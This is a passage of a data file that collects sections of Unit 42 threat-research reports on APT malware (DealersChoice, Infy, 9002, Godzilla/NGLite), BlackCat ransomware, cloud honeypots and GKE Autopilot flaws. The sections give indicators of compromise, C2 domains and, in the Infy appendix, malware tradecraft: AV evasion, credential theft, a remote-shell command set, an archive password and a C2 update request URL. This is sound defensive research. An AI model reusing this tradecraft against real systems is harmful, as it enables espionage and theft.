to protect against this vulnerability and against future Linux zero-day vulnerabilities. Many privilege escalation vulnerabilities in the Linux kernel can only be exploited for container escape when the container is allowed to create a new user namespace, or in other words, when the container runs without Seccomp.\nPrisma Cloud users are encouraged to reviewCompute/Monitor/Complianceand determine whether any of their containers run without Seccomp. Users can also choose to block containers running without Seccomp, as shown in Figure 13.\nUpdate March 7, 2022, at 7:00 a.m. PT.", "source": "Palo"}, {"title": "Introduction", "content": "Recently, Palo Alto Networks Unit 42 reported on anew exploitation platformthat we called \"DealersChoice\" in use by theSofacy group(AKA APT28, Fancy Bear, STRONTIUM, Pawn Storm, Sednit).  As outlined in our original posting, the DealersChoice exploitation platform generates malicious RTF documents which in turn use embedded OLE Word documents. These embedded OLE Word documents then contain embedded Adobe Flash (.SWF) files that are designed to exploit Abode Flash vulnerabilities.\nAt the time of initial reporting, we found two variants:\nVariant A: A standalone variant that included Flash exploit code packaged with a payload. \nVariant B: A modular variant that loaded exploit code on-demand and appeared non-operational at the time.\nSince that time, we have been able to collect additional samples of the weaponized documents that the DealersChoice exploitation platform generates. These latest, additional samples are all Variant B samples. Two of these samples were found to have operational command and control servers which allowed us to collect and analyze additional artifacts associated with the attack.\nIn late October 2016 Adobe issued Adobe Security BulletinAPSB16-36to addressCVE-2016-7855. In early November 2016 Microsoft issued Microsoft Security BulletinMS16-135to addressCVE-2016-7255.\nBoth of these were in response to active exploitation of zero-day vulnerabilitiesthought by other researchers to be associated with the Sofacy group. Additional reporting as well as our own analysis indicates the exploit code for the Adobe Flash vulnerability CVE-2016-7855 was indeed delivered using DealersChoice. In-house testing also reveals customers of Palo Alto Networks Traps end-point agent are protected by the new exploit code.", "source": "Palo"}, {"title": "Conclusion", "content": "It appears evident at this time that the Sofacy group is actively using the DealersChoice tool, specifically the Variant B, to attack targets of interest. As evidenced by the delivery of exploit code for a recently patched  vulnerability in Flash (which was used in zero-day attacks), we can see how the malware provides flexibility in exploitation methodology and is truly a platform in itself. New infrastructure does appear to have been created for DealersChoice, but as we have seen in the past, the Sofacy group has a tendency to reuse artifacts from previous campaigns and this is no exception. Palo Alto Networks customers may learn more and are protected via:\nCorrectly identify associated samples as malicious in WildFire \nDealersChoice domains and C2 traffic are classified as malicious \nTraps correctly identifies and prevents exploit code to be executed \nADealersChoice AutoFocus tag may be used to identify and track this malware family\nNote that even though CVE-2016-7855 was a zero-day vulnerability, Palo Alto Networks customers would have been protected by our Traps endpoint agent as seen in Figure 8.\nFigure 8 Palo Alto Networks Traps blocking exploitation of the CVE-2016-7855 vulnerability", "source": "Palo"}, {"title": "Indicators", "content": "Document Hashes:\nf5d3e827c3a312d018ef4fcbfc7cb5205c9e827391bfe6eab697cc96412d938e1f81609d9bbdc7f1d2c8846dcfc4292b3e2642301d9c59130f58e21abb0001be1579c7a1e42f9e1857a4d1ac966a195a010e1f3d714d68c598a64d1c83aa36e4c5a389fa702a4223aa2c2318f38d5fe6eba68c645bc0c41c3d8b6f935eab3f64137185866649888b7b5b6554d6d5789f7b510acd7aff3070ac55e2250eb88dab73ea2ccec2cbf22d524f55b101d324d89077e5718922c6734fef95787121ff22\nDealersChoice C2s:\nVersiontask[.]comUniquecorpind[.]comSecurityprotectingcorp[.]compostlkwarn[.]comadobeupgradeflash[.]comresearchcontinental[.]org\nSeduploader C2s:\nAppservicegroup[.]comApptaskserver[.]comAkamaisoftupdate[.]comJoshel[.]comglobaltechresearch[.]orgresearchcontinental[.]org", "source": "Palo"}, {"title": "Introduction", "content": "Attack campaigns that have very limited scope often remain hidden for years. If only a few malware samples are deployed, it's less likely that security industry researchers will identify and connect them together.\nIn May 2015, Palo Alto Networks WildFire detected two e-mails carrying malicious documents from a genuine and compromised Israeli Gmail account, sent to an Israeli industrial organization. One e-mail carried a Microsoft PowerPoint file named \"thanks.pps\" (VirusTotal), the other a Microsoft Word document named \"request.docx\".\nAround the same time, WildFire also captured an e-mail containing a Word document (\"hello.docx\") with an identical hash as the earlier Word document, this time sent to a U.S. Government recipient.\nBased on various attributes of these files and the functionality of the malware they install, we have identified and collected over 40 variants of a previously unpublished malware family we call Infy, which has been involved in attacks stretching back to 2007. Attacks using this tool were still active as of April 2016.", "source": "Palo"}, {"title": "Conclusion", "content": "We have enough evidence to conclude a pattern of behavior following extensive analysis of this malware and C2 infrastructure between these samples. The activity has been observed over almost 10 years, with the malware being constantly improved and developed. The low-volume of activity, deliberate campaign focus and content tailoring, and nature of targets hints at the goals of this actor.\nWe believe that we have uncovered a decade-long operation that has successfully stayed under the radar for most of its existence as targeted espionage originating from Iran. It is aimed at governments and businesses of multiple nations as well as its own citizens.\nPalo Alto Networks customers are protected from this threat in the following ways:\nWildFire accurately identifies all malware samples related to this operation as malicious. \nDomains used by this operation have been flagged as malicious in Threat Prevention. \nAutoFocus users can view malware related to this attack using the \"Infy tag.\nIOCs can be found in the appendices of this report.\nSpecial thanks to Michael Scott for assistance with Maltego in this investigation.", "source": "Palo"}, {"title": "Appendix", "content": "Although Infy is fundamentally one malware family, we observe two distinct variants. The regular variant \"Infy\" is versioned by the malware author 1-30 (1999 -15999 sub-versions). In addition, we observe a distinct variant \"Infy M\" developed in parallel with the regular variant since about 2013. Infy M appears to be a full featured variant, deployed against high-value targets. It includes more functionality: while the original variant has no remote control, \"M\" adds the ability for the C2 to issue commands to the malware via C2 PHP scripts; HTTP support; a hidden GUI control panel; and FTP client.\nDetailed analysis of a recent Infy sample (version 30, active from 24 February 2016):\nThe initial executable first checks for installed antivirus programs. It uses the Windows API function \"GetFileattributeA\" on a list of several common AV installation directories, testing any positive return with \"file_attribute_directory\". Depending on which AV Infy finds, it will either abort, or install the malicious Infy DLL using a different technique. This concern with avoiding client-AV detection, skipping installation rather than risk alerting, is somewhat noteworthy (as opposed to the relatively common sandbox-detection techniques). The EXE installs the DLL, writes to the autorun key, and does nothing else until restart.\nUpon restart, the EXE loader executes the main function, exported by the DLL malware file DLL (previously we observed functions named \"start1/start2/start3\") with the parameter /rcv (this version uses a decryption offset of 19). It installs itself in \"cyberlink\" directory.\nIt will then search for files with \"bak\", \"csv\", or \"cnt\", extensions. If the parameter \"/rcv\" was used, it starts a keylogger (the keylogger uses a window name \"TRON2VDLLB\" (GetMessageA/translate message/DispatchMessageA). It next registers hotkeys, and gets clipboard data. Get_browser_data steals passwords, forms, cookies, history (from Microsoft Edge, Internet Explorer, Google Chrome, Opera, and Firefox).\nThe malware connects to the C2 every five minutes using HTTP, posting:\n<computer name><user name>dn = n1ver = 30lfolder= fcpuid=machineguid (from hklm\\SOFTWARE\\Microsoft\\Cryptography\\machineguid)tt= time\nAfter posting data about the infected system to the C2 server, the malware downloaded an update named \"v30nXf1.tmp\" file to %temp%\\drvtem64.tmp. If the download is successful, the malware writes \"OK, Downloaded [url file]\" to log file. It then connects again, with a similar posting format, but this time also adding \"tt=\" (time) and \"cpuid=\". It installs the downloaded file with parameter \"-sp/ins -pBA5a88E\". A third connection adds \"sfolder\", \"subject\", and this time exfiltrates data in the \"body=\" parameter.\nEach variant of Infy uses specific \"cover\" camouflage to with file metadata that makes it appear as though it is legitimate software. In this case, the file used the software name \"Cyberlink,\" and a description of \"CLMediaLibrary Dynamic Link Library\" and listing version 4.19.9.98.\nWe observed the Infy M variant with versions 6.1 through 7.8, adding features including screen capture, document capture & upload, and microphone capture. Infy M supports the following C2 commands:\nASIDLE - idleASDIR \u2013 directory list of filesASPUT \u2013 download fileASGET \u2013 upload fileASZIPGET \u2013 upload as zipASDELETE \u2013 delete fileASRENAME \u2013 rename fileASRUN \u2013 execute fileASENDTASK \u2013 terminate processASZIP \u2013 zip fileASSHELL \u2013 remote shell\nThe \"M\" variant uses mostly distinct C2 servers from the regular Infy samples (although very recently, we also observed version 7.8 using C2 \"youripinfo.com\", previously seen as C2 for the regular variant):\nbestupdateserver[.]com \u2013 Observed 2013-12-09www.bestupdateserver[.]com - Observed 2013-04-26bestbox3[.]com \u2013 Observed 2015-08-25www.bestupdateserver2[.]com - Observed 2015-05-22bestupdateserver2[.]com \u2013 Observed 2014-07-16\nVersions 6.x of the Infy M variant camouflage themselves with file and window names set to Borland hcrtf. They use a single EXE, rather than a loader EXE and payload DLL as seen in the original variant. The malware initially performs a check to see if the victim as already infected by checking for window names \"Borland hcrtf 6.x\" or \"Macromedia Swsoc 7.x\".\nWe have identified five hidden GUI control forms in Infy M, one of which is not used. The first form includes three possible parameters. Parameter \"/ins\" installs the Trojan. It first creates and starts the service and on Windows versions prior to Vista it requires the \"/s\" parameter. After installing itself, the malware deletes any previous Infy installations. The does this by terminating processes and deleting Infy files in %system32%, %appdata%, %appdata%\\hcrtf (for example, pre-6.1 files incsy32.exe, incs32.exe, ntvdn.exe, grep.exe, hcrtf.exe, grep.dll). It then renames the ini file from grepc.ini to hcrtfc.ini. It completes clean-up by deleting the \"inverse Ser32\", \"grep\", and \"hcrtf\" services. Finally, it downloads and executes the update file from the C2 at /infy/update.php.\nThe /c (copy) parameter sets up autostart for the malware by writing to registry key \"run\" (Windows Vista and above) or \"runservices\" (versions prior to Windows Vista). The /s (service) parameter creates and starts the service (Windows Vista and later). At this point, the malware waits, and handles any commands issued over HTTP from the C2 (for example, execute a remote shell upon receiving command \"ASSHELL\").\nThe second form monitors for new or modified document files using \"CreateIoCompletionPort\" and \"ReadDirectoryChangesW\". It targets document file types .doc, .xls , .jpg, .jpe, .txt, .htm, .pgp, .pdf, .zip, and .rar and ZIP compresses them (using the password \"Z8(2000_2001uI\") into a file located at \\Program Files\\Yahoo!\\Messenger\\Profiles\\yfsbg\\yfsbg\\3dksf.tmp.\nThe third form takes a screen captures and stores it the \"yfsbg\" folder as 4dksf.tmp. It the uploads the screenshot and document-capture files using POST (instead of using GET as seen in the regular variants) to <C2 server>/infy/fms.php.\nThe fourth form is not used. The fifth form is used for microphone capture.\nThe 7.x versions install themselves as swsoc.exe (7.4 also seen using infy74f1.exe) at <documents and settings>\\all users\\application data\\macromedia\\8080\\swsoc.exe. They also create a subfolder \"fsbg\", where they store the copies of documents opened by the user. These are stored with their CRC value as their filename, RAR compressed with the same password \"Z8(2000_2001uI\".\nWe observed a server reply with error in the PHP, giving us some of their underlying file structure:\n<b>Warning</b>: Cannot modify header information - headers already sent by (output started at /home/bestupda/public_html/infy/fms.php:115) in <b>/home/bestupda/public_html/infy/fms.php</b> on line <b>116</b><br />\nUpgrade requests are observed with this syntax (here, version 6.2 to the latest version):\nhttp://www.bestupdateserver.com/infy/update.php?cn=<computername>&ver=6.2&u=27/3/2016 20:37:23", "source": "Palo"}, {"title": "Appendix", "content": "analyse1[.]mooo[.]combest[.]short-name[.]combest2[.]short-name[.]combest2[.]short-url20[.]combest3[.]short-url20[.]combest4[.]short-url20[.]combest5[.]short-url20[.]combest6[.]short-url20[.]combest7[.]short-url20[.]combestbox3[.]combestupdateserver[.]combestupdateserver2[.]combestupser[.]awardspace[.]infobestwebstat[.]combl2pe[.]bestwebstat[.]combox4054[.]netc1[.]short-url20[.]comdbook[.]soon[.]itdsite[.]dyx[.]comextd[.]mine[.]bzfastecs[.]netfirms[.]comfastupdate[.]netgstat[.]strangled[.]netlost[.]updateserver1[.]comlu[.]ige[.]esmand[.]pwnz[.]orgmyblog2000[.]comns2[.]myblog2000[.]comnus[.]soon[.]itsafehostonline[.]comsecup[.]soon[.]itshort-name[.]comshort-url20[.]comupdate[.]info[.]gfupdatebox4[.]comupdateserver1[.]comupdateserver3[.]comus1[.]short-name[.]comus12[.]short-url20[.]comus13[.]short-url20[.]comus15[.]short-url20[.]comus16[.]short-url20[.]comus1s2[.]strangled[.]netwep[.]archvisio[.]comwep[.]soon[.]itwpstat[.]mine[.]bzwpstat[.]strangled[.]netwww[.]fastupdate[.]netwww[.]updateserver1[.]comyouripinfo[.]com", "source": "Palo"}, {"title": "Introduction", "content": "BlackCat (aka ALPHV) is a ransomware family that surfaced in mid-November 2021 and quickly gained notoriety for its sophistication and innovation. Operating a ransomware-as-a-service (RaaS) business model, BlackCat was observed soliciting for affiliates in known cybercrime forums, offering to allow affiliates to leverage the ransomware and keep 80-90% of the ransom payment. The remainder would be paid to the BlackCat author.\nBlackCat has taken an aggressive approach to naming and shaming victims, listing more than a dozen on their leak site in a little over a month. The largest number of the group's victims so far are U.S. organizations, but BlackCat and its affiliates have also attacked organizations in Europe, the Philippines and other locations. Victims include organizations in the following sectors: construction and engineering, retail, transportation, commercial services, insurance, machinery, professional services, telecommunication, auto components and pharmaceuticals.\nUse of BlackCat ransomware has grown quickly for a variety of reasons (for comparison,AvosLockerhad only listed a handful of victims publicly within two months of becoming known). Effective marketing to affiliates is a likely factor \u2013 in addition to offering an enticing share of ransom payments, the group has solicited affiliates by posting ads on forums such as Ransomware Anonymous Market Place (RAMP).\nThe malware itself is coded in the Rust programming language. Though this is not the first piece of malware to use Rust, it is one of the first, if not the first, piece of ransomware to use it. By leveraging this programming language, the malware authors are able to easily compile it against various operating system architectures. Given its numerous native options, Rust is highly customizable, which facilitates the ability to pivot and individualize attacks.\nThe threat actors leveraging BlackCat, often referred to as the \"BlackCat gang,\" utilize numerous tactics that are becoming increasingly commonplace in the ransomware space. Notably, they use multiple extortion techniques in some cases, including the siphoning of victim data before ransomware deployment, threats to release data if the ransom is not paid and distributed denial-of-service (DDoS) attacks.\nPalo Alto Networks detects and prevents BlackCat ransomware with the following products and services:Cortex XDRandNext-Generation Firewalls(including cloud-delivered security subscriptions such asWildFire).\nDue to the surge of this malicious activity, we've created this threat assessment for overall awareness.", "source": "Palo"}, {"title": "Conclusion", "content": "BlackCat is an innovative and sophisticated ransomware family that is rapidly forming a reputation for its highly customized and individualized attacks. By leveraging the Rust programming language, the malware authors are able to easily compile it against various operating system architectures, which facilitates the group's ability to pivot from one victim to the next. As seen with other ransomware families, BlackCat operates with a RaaS model and utilizes multiple extortion techniques, then publishes a leak site to further pressure victims into paying the ransom.\nPalo Alto Networks detects and prevents BlackCat ransomware in the following ways:\nWildFire: All known samples are identified as malware. \nCortex XDRwith:Indicators for BlackCat.Anti-Ransomware Module to detect BlackCat encryption behaviors on Windows.Local Analysis detection for BlackCat binaries on Windows.BTP rule prevents Ransomware activity on Linux. \nIndicators for BlackCat. \nAnti-Ransomware Module to detect BlackCat encryption behaviors on Windows. \nLocal Analysis detection for BlackCat binaries on Windows. \nBTP rule prevents Ransomware activity on Linux. \nNext-Generation Firewalls: DNS Signatures detect the known command and control (C2) domains, which are also categorized as malware inURL Filtering.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "An insecurely exposed service is one of the most commonly seenmisconfigurationsin cloud environments. These services are discoverable on the internet and can pose a significant risk to cloud workloads in the same infrastructure. Notorious ransomware groups such asREvilandMespinozaare known to exploit exposed services to gain initial access to victims' environments. Using a honeypot infrastructure of 320 nodes deployed globally, researchers aim to better understand the attacks against exposed services in public clouds.\nUnit 42 researchers deployed multiple instances of remote desktop protocol (RDP), secure shell protocol (SSH), server message block (SMB) and Postgres database in the honeypot infrastructure.Researchers found that 80% of the 320 honeypots were compromised within 24 hours and all of the honeypots were compromised within a week.Some findings that stand out are:\nSSH was the most attacked application. The number of attackers and compromising events was much higher than for the other three applications. \nThe most attacked SSH honeypot was compromised 169 times in a single day. \nOn average, each SSH honeypot was compromised 26 times daily. \nOne threat actor compromised 96% of our 80 Postgres honeypots globally within 30 seconds. \n85% of the attacker IPs were observed only on a single day. This number indicates that Layer 3 IP-based firewalls are ineffective as attackers rarely reuse the same IPs to launch attacks. A list of malicious IPs created today will likely become outdated tomorrow.\nThe speed of vulnerability management is usuallymeasured in days or months. The fact that attackers could find and compromise our honeypots in minutes was shocking. This research demonstrates the risk of insecurely exposed services. The outcome reiterates the importance of mitigating and patching security issues quickly. When a misconfigured or vulnerable service is exposed to the internet, it takes attackers just a few minutes to discover and compromise the service. There is no margin of error when it comes to the timing of security fixes.\nPrisma Cloudcan identify and prevent vulnerabilities and misconfigurations across the entire application lifecycle while prioritizing risk for your cloud native environments.VM-Seriesfirewalls can help detect and defend against malicious activities in virtualized environments.", "source": "Palo"}, {"title": "Conclusion", "content": "The problem of insecurely exposed services is not new to public cloud, but the agility of cloud infrastructure management makes the creation and replication of such misconfigurations faster. The research highlights the risk and severity of such misconfigurations. When a vulnerable service is exposed to the internet, opportunistic attackers can find and attack it in just a few minutes. As most of these internet-facing services are connected to some other cloud workloads, any breached service can potentially lead to the compromise of the entire cloud environment.\nThis type of misconfiguration, however, is not difficult to prevent and remediate with cloud-native approaches. Some strategies that system administrators can take are:\nCreate a guardrail to prevent privileged ports from being open. For example, useAWS Service Control PoliciesorAzure Firewall Management. \nCreate audit rules to monitor all the open ports and exposed services. For example, useAWS Config,Checkov, orCloud Security Posture Managementtools \nCreate automated response and remediation rules to fix misconfigurations automatically. For example, considerAWS Security HuborPrisma Cloud Automated Remediation. \nDeploy next-generation firewalls in front of the applications, such asVM-SeriesorWAFto block malicious traffic.", "source": "Palo"}, {"title": "Introduction", "content": "This post is the first in a new series titledExamining the Cybercrime Underground. Each post will delve into different aspects of how cybercriminals operate, using current examples of tools and techniques.What are their tools of the trade? How do they get them? How do they overcome challenges posed by security and anti-fraud systems? How do criminals profit from scams and turn stolen data into cash? Answering these questions will help readers better understand one of their primary cyberadversaries and use that knowledge to better protect their networks.", "source": "Palo"}, {"title": "Conclusion", "content": "The cybercrime underground is evolving, and enterprises using legacy security solutions won't be protected without a next-generation enterprise security platform. Our next post on the cybercrime underground will be focused on the after-attack phases, including how attackers use victims' credit card data to steal money, and the current state of the phishing market underground.", "source": "Palo"}, {"title": "Introduction", "content": "Over the past several weeks, Russia-Ukraine cyber activity has escalated substantially.Beginning on Feb. 15, a series of distributed denial of service (DDoS) attacks commenced. These attacks have continued over the past week, impacting both the Ukrainian government and banking institutions. On Feb. 23, a new variant of wiper malware named HermeticWiper was discovered in Ukraine. Shortly after, a new round of website defacement attacks were also observed impacting Ukrainian government organizations.\nConsistent with our previous reporting on the topic, several western governments have issued recommendations for their populations to prepare for cyberattacks that could disrupt, disable or destroy critical infrastructure.We have already observed an increase in Russian cyber activity,which we reported on in our initialThreat Briefpublished last month and our recent report on theGamaredon group. Future attacks may target U.S. and Western European organizations in retaliation for increased sanctions or other political measures against the Russian government. We recommend that all organizations proactively prepare to defend against this potential threat.\nThis post was substantially updated on Feb. 24 to add information on the recent DDoS attacks, HermeticWiper malware and website defacement; update our recommendations for how organizations should prepare for potential cyber impact; and provide additional details for our customers and clients on how we can help. This post was substantially updated March 31 to add information on phishing and scam attacks, cybersquatting trends, fake donation websites, DoS attacks on Ukrainian news sites and distribution of malicious binaries.\nFull visualization of the techniques observed, relevant courses of action and indicators of compromise (IoCs) related to this report can be found in theUnit 42 ATOM viewer.\nWe will continue to provide updates with new information and recommendations as they become available.", "source": "Palo"}, {"title": "Indicators", "content": "HermeticWiper SHA256\n1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d2925910385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21daa64c3e0522fad787b95bfb6a30c3aed1b5786e69e88e023c062ec7e5cebf4d3e3c557727953a8f6b4788984464fb77741b821991acbf5e746aebdd02615b17672c10b2ec0b995b88c27d141d6f7b14d6b8177c52818687e4ff8e6ecf53adf5bf06086c1da4590dcc7f1e10a6be3431e1166286a9e7761f2de9de79d7fda9c397\nCertificate\nName Hermetica Digital LtdThumbprint 1AE7556DFACD47D9EFBE79BE974661A5A6D6D923Serial Number 0C 48 73 28 73 AC 8C CE BA F8 F0 E1 E8 32 9C EC\nWebsite Defacement Domain\ngcbejm2rcjftouqbxuhimj5oroouqcuxb2my4raxqa7efkz5bd5464id[.]onion\nScam and Phishing URLs, Fake Donation Sites, Fake Browser or Messenger\nPlease see theIoCs on GitHub.", "source": "Palo"}, {"title": "Appendix", "content": "InAlert AA22-011A(updated March 1, 2022), the U.S. Department of Homeland Security's Cybersecurity and Infrastructure Security Agency (DHS/CISA) identifies a selection of vulnerabilities that Russian advanced persistent threat (APT) groups are assessed to have exploited in the past, but recommends that users take action against a much broader list of known exploited vulnerabilities (KEVs). The cited KEVs and their impacted devices \u2013 all of which can be identified using Cortex Xpanse \u2013 are:\nCVE-2018-13379 FortiGate VPNs \nCVE-2019-1653 Cisco router \nCVE-2019-2725 Oracle WebLogic Server \nCVE-2019-7609 Kibana \nCVE-2019-9670 Zimbra software \nCVE-2019-10149 Exim Simple Mail Transfer Protocol \nCVE-2019-11510 Pulse Secure \nCVE-2019-19781 Citrix \nCVE-2020-0688 Microsoft Exchange \nCVE-2020-4006 Multiple Vmware Products \nCVE-2020-5902 F5 Big-IP \nCVE-2020-14882 Oracle WebLogic \nCVE-2021-26855 Microsoft Exchange\nCortex Xpanse's ability to index the entire internet helps organizations discover, prioritize, and remediate significant exposures on their attack surfaces \u2013 including all of the impacted services listed above. Weroutinely observe vulnerable devices across the global internet, despite the fact that most of these CVEs are more than two years old.\nBeyond Alert AA22-011A, CISA's overarching guidance for attack surface reduction includes hardening of forward-facing network services, with prioritized patching of KEVs, as documented inBinding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities (KEV). This directive requiresagencies to remediate all vulnerabilities that CISA includes in theirKEV catalogbased on an assessment that the vulnerabilities\"carry significant risk to the federal enterprise.\"Learn more and see a detailed workflow example on the Palo Alto Networks SecOps blog, \"How Xpanse Can Identify CISA-Identified Known Exploited Vulnerabilities.\"\nUpdated April 1, 2022, at 11 a.m. PT.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 recently observed a 9002 Trojan delivered using a combination of shortened links and a shared file hosted on Google Drive. The delivery method also uses an actor-controlled server hosting a custom redirection script to track successful clicks by targeted email addresses. The infrastructure associated with this 9002 Trojan sample was also found to have previous ties to attacks on Myanmar and other Asian countries that used Poison Ivy as the payload, including a recent, and possibly ongoing campaign against Taiwan.", "source": "Palo"}, {"title": "Conclusion", "content": "The use of Google Drive to host malicious files is not a new tactic in attacks. However, using a well-known hosting platform may allow the downloading of a payload to blend into other legitimate traffic from the hosting provider. The actors still use spear phishing as their primary attack method, but because that technique has been so well publicized, intended victims are perhaps more cautious about opening suspicious email attachments or links. As spear phishing becomes less successful, threat actors need to continue to adapt and find new methods to successfully deliver malware. The use of a URL shortening service and a redirection server further aids the chances of a successful attack, as it becomes more challenging to determine the validity of the link within an email due to the way link shorteners obfuscate link content.\nThe files used in these attacks are properly classified as malware by WildFire. AutoFocus customers can find out more about both9002andPoison Ivyvia the respective malware family tags.", "source": "Palo"}, {"title": "IOC", "content": "9002 samples\nC11b963e2df167766e32b14fb05fd71409092092db93b310a953e1d0e9ec9bc349ac6a6c5449396b98a89709b0ad21d078af783ec8f1cd32c1c8b5ae71bec129\nPoison Ivy samples\n193ae4da14874aa29902052d08064395afa5e4763f949e7369157d893fa08653ac8fc264c7ec3cf70836e1bb21f9a20174b04ad49731b8797d7d8bb95cb353e212759f7fd01ffdea97954be5404d7e43a3941a7388129e7b6ace85f56b500cd80940602e7d47941f36c975afa9d2c6b1b0d2bd15bbea6ad4baf0f828420d72bf6bdd45cb6c021512c203cf01a051dce28449e364627e1366412c0051094f60a0f0ab826ea65b4a9eb66528ad74c4d3e747c1ecebfca6bdafd2504e0f794195d9e2fb4a53e54774f1645c940f905e76beb5fc729e9e968b736b8377312cb2454a0af768b4ba8fe7aac7a7da7fd5f21e7496d5617dccdf2321f526fd1091d64a6dfd21cd1846f25d42b1997ec1fd5ae6e14ea9b5bb0161ab7edf0ce184174e6da612759f7fd01ffdea97954be5404d7e43a3941a7388129e7b6ace85f56b500cd808dee1f5ced372716ad5c6e3f2041bcdeb25e905efc19d3749fe637d0a589ccc269c03e205c403ab8fa1033caa1c8e3a86a1495cc33a7f3a3a3c9b8a9ea774903a9ab623c8a0a9f6c65e108e83c90da7620d2d6b22192c857556117587d0d038\nC2 Domains\nlogitechwkgame[.]comjackhex.md5c[.]netwebserver.servehttp[.]comadmin.nslookupdns[.]comouthmail[.]commxdnsv6[.]commicrosoftdefence[.]commicrosoftserve[.]comgooledriveservice[.]comqueryurl[.]comappupdatemoremagic[.]com", "source": "Palo"}, {"title": "Introduction", "content": "In February 2021, Google announcedAutopilot, a new mode of operation inGoogle Kubernetes Engine(GKE). With Autopilot, Google provides a \"hands-off\" Kubernetes experience, managing cluster infrastructure for the customer. The platform automatically provisions and removes nodes based on resource consumption and enforces secure Kubernetes best practices out of the box.\nIn June 2021, Unit 42 researchers disclosed several vulnerabilities and attack techniques in GKE Autopilot to Google. Users able to create a pod could have abused these to (1) escape their pod and compromise the underlying node, (2) escalate privileges and become full cluster administrators, and (3) covertly persist administrative access through backdoors that are completely invisible to cluster operators.\nAn attacker who obtained an initial foothold on an Autopilot cluster, for example, through a compromised developer's account, could have exploited these issues to escalate privileges and become a \"shadow administrator,\" with the ability to covertly exfiltrate secrets, deploy malware or cryptominers and disrupt workloads.\nFollowing our disclosure, Google fixed the reported issues, deploying patches universally across GKE. All Autopilot clusters are now protected.\nThis blog provides a technical analysis of the issues, as well as mitigations for preventing similar attacks against Kubernetes and GKE environments. For a high-level overview of the issues, please refer to our blog on the Palo Alto Networks site,Unit 42 Discloses Newly Discovered Vulnerabilities in GKE Autopilot.\nPalo Alto Networks customers receive protections from the issues discussed below through the Kubernetes admission control and auditing features ofPrisma Cloud.", "source": "Palo"}, {"title": "Background", "content": "Autopilot is a new mode of operation in GKE, providing what Google describes as a \"hands-off\" Kubernetes experience. In GKE Standard, customers manage their cluster infrastructure and pay per node. With GKE Autopilot, Google takes care of cluster infrastructure, and customers only pay for their running pods. This allows customers to focus on their applications, cutting operational costs.\nIn a nutshell, managed cluster infrastructure means Google automatically:\nProvisions and adjusts the number of nodes according to your pods' resource consumption. \nEnforces a built-in policy to ensure the cluster adheres to secure best practices and can be safely managed by Google.\nBelow is a simplified diagram of Autopilot's architecture. Components unique to Autopilot are colored in green and shown with a number corresponding to their role from the list above. Unlike GKE Standard, where nodes are visible as Compute Engine VMs, Autopilot nodes are completely managed by Google, thus colored in green.\nAs seen in Figure 1, two components enforce Autopilot's policy. First is anOPA Gatekeepervalidating admission webhook, an open-source project widely used for policy enforcement in Kubernetes. The second is a proprietary Kubernetes authorization mode named GKEAutopilot, which Google implemented by modifying the Kubernetes source code.\nThe built-in policy serves twopurposes: (a) prevent users from accessing cluster components managed by Google, like nodes; and (b) uphold secure Kubernetes best practices. For example, Autopilot forbids running privileged containers, fulfilling both (a) and (b).\nAutopilot's policy goes beyond preventing container escapes. Figures 3, 4, and 5 highlight a few interesting examples.GKE's documentationlists every limit enforced by the policy.\nReading the error messages in the Figures above, you can see that Gatekeeper prevented the operations in Figures 2 and 5, while the GKEAutopilot authorization mode prevented the operations in Figures 3 and 4.", "source": "Palo"}, {"title": "Conclusion", "content": "As organizations migrate to Kubernetes, attackers follow suit. Recent malware samples likeSilocapeindicate adversaries are evolving beyond simple techniques into advanced Kubernetes tailored attacks. Against sophisticated attackers, solely securing the cluster's perimeter may not be enough. We encourage defenders to adopt policy and audit engines that enable detection and prevention of follow-on, \"stage 2\" attacker activities, and we hope this research can highlight how those may look.Prisma Cloudcustomers are encouraged to enable our Kubernetesadmission controlandauditingfeatures aimed at tackling this threat.\nWe'd like to thank Google for their cooperation in resolving these issues, the bounty reward and theirwonderful policythat doubles bounties donated to charity.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.\nAdditional Resources\nGKE Autopilot documentation \nsa-hunter \nSiloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments \nProtecting Against an Unfixed Kubernetes Man-in-the-Middle Vulnerability (CVE-2020-8554)", "source": "Palo"}, {"title": "Introduction", "content": "On Sept. 16, 2021, the US Cybersecurity and Infrastructure Security Agency (CISA) released analertwarning that advanced persistent threat (APT) actors were actively exploiting newly identified vulnerabilities in a self-service password management and single sign-on solution known as ManageEngine ADSelfService Plus. The alert explained that malicious actors were observed deploying a specific webshell and other techniques to maintain persistence in victim environments; however, in the days that followed, we observed a second unrelated campaign carry out successful attacks against the same vulnerability.\nAs early as Sept. 17 the actor leveraged leased infrastructure in the United States to scan hundreds of vulnerable organizations across the internet. Subsequently, exploitation attempts began on Sept. 22 and likely continued into early October. During that window, the actor successfully compromised at least nine global entities across the technology, defense, healthcare, energy and education industries.\nFollowing initial exploitation, a payload was uploaded to the victim network which installed aGodzillawebshell. This activity was consistent across all victims; however, we also observed a smaller subset of compromised organizations who subsequently received a modified version of a new backdoor calledNGLite. The threat actors then used either the webshell or the NGLite payload to run commands and move laterally to other systems on the network, while they exfiltrated files of interest simply by downloading them from the web server. Once the actors pivoted to a domain controller, they installed a new credential-stealing tool that we track as KdcSponge.\nBoth Godzilla and NGLite were developed with Chinese instructions and are publicly available for download on GitHub. We believe threat actors deployed these tools in combination as a form of redundancy to maintain access to high-interest networks. Godzilla is a functionality-rich webshell that parses inbound HTTP POST requests, decrypts the data with a secret key, executes decrypted content to carry out additional functionality and returns the result via a HTTP response. This allows attackers to keep code likely to be flagged as malicious off the target system until they are ready to dynamically execute it.\nNGLite is characterized by its author as an \"anonymous cross-platform remote control program based on blockchain technology.\" It leveragesNew Kind of Network 